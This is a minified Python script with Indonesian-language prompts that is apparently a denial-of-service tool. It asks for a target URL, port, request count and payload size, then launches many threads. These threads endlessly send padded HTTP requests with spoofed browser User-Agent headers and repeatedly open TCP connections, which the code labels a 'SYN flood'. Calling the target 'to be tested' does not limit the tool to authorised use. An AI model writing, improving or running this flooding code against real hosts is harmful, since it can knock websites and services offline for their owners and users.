_A='Error: Tidak dapat menemukan IP untuk URL tersebut.'
import requests,socket,threading,random,time
def get_ip(url):
	try:A=socket.gethostbyname(url);return A
	except socket.gaierror:print(_A);return
def send_request(url,ip,port,payload_size):
	A=payload_size
	while True:
		try:
			B=requests.get(f"http://{ip}:{port}",headers=generate_random_headers(),data='A'*A,timeout=5)
			if B.status_code==200:print(f"Request sent to {ip}:{port} with payload size {A}")
			else:print(f"Non-200 response: {B.status_code}")
		except requests.exceptions.RequestException as C:print(f"Error: {C}")
def syn_flood(url,ip,port):
	while True:
		try:A=socket.socket(socket.AF_INET,socket.SOCK_STREAM);A.settimeout(2);A.connect((ip,port));A.send(b'SYN flood packet');print(f"SYN Flooding {ip}:{port}");A.close()
		except socket.error as B:print(f"SYN flood failed: {B}")
def generate_random_headers():A={'User-Agent':random.choice(['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3','Mozilla/5.0 (Windows NT 6.1; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36']),'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8','Connection':'keep-alive'};return A
def attack(url,port,num_requests,payload_size):
	C=port;A=url;B=get_ip(A)
	if B is None:print(_A);return
	print(f"Starting attack on {A} ({B}) on port {C}...")
	for D in range(num_requests):threading.Thread(target=send_request,args=(A,B,C,payload_size)).start();threading.Thread(target=syn_flood,args=(A,B,C)).start()
if __name__=='__main__':url=input('Masukkan URL yang ingin diuji: ').strip();port=int(input('Masukkan port yang digunakan (contoh: 443 untuk HTTPS atau 80 untuk HTTP): ').strip());num_requests=int(input('Masukkan jumlah request per bot: ').strip());payload_size=int(input('Masukkan ukuran payload per request (dalam byte): ').strip());attack(url,port,num_requests,payload_size)